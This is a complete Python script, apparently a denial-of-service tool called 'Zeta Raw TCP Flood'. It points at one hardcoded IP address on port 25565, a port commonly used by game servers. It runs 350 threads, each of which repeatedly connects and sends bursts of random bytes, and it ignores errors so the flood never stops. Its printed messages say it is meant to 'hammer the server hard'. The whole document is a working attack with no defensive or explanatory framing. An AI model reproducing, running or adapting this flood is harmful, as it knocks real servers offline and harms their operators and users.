import socket
import random
import time
import threading

TARGET_IP = "132.226.209.34"
TARGET_PORT = 25565

print("=== Zeta Raw TCP Flood - 132.226.209.34:25565 ===")
print("Random packets TCP spam running...\n")

def tcp_flood_worker():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Spam random packets
            for _ in range(8):
                random_data = random.randbytes(random.randint(512, 2048))
                s.send(random_data)
            
            s.close()
        except:
            pass  # Fail fast, reconnect

def main():
    threads = 350
    
    print(f"[ZETA] Starting raw TCP flood with {threads} threads...")
    
    for _ in range(threads):
        t = threading.Thread(target=tcp_flood_worker, daemon=True)
        t.start()
    
    print("[ZETA] RAW TCP FLOOD ACTIVE - Full random packet spam")
    print("This will eat your bandwidth and hammer the server hard.")
    
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n[ZETA] Flood stopped.")

if __name__ == "__main__":
    main()
